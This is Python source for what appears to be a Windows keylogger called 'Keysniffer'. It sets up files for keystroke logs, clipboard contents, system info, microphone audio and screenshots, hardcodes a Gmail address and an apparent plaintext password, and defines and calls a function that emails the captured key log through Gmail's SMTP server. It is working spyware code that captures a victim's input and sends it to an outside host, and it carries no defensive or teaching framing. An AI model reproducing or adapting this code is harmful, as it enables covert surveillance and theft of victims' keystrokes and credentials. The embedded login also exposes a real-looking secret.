from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

import getpass
from requests import get


keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = "7unkym0nk3y@gmail.com"  # Enter disposable email here
password = "262dZwBcad&q@qJEaneX"  # Enter email password here

username = getpass.getuser()

toaddr = "7unkym0nk3y@gmail.com"  # Enter the email address you want to send your information to

file_path = "C:\\Users\\Cyb3r_Tyr\\Documents\\GitHub\\Keysniffer\\Keysniffer"  # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend


# email controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg["From"] = fromaddr

    msg["To"] = toaddr

    msg["Subject"] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, "plain"))

    filename = filename
    attachment = open(attachment, "rb")

    p = MIMEBase("application", "octet-stream")

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header("Content-Disposition", "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP("smtp.gmail.com", 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


send_email(keys_information, file_path + extend + keys_information, toaddr)
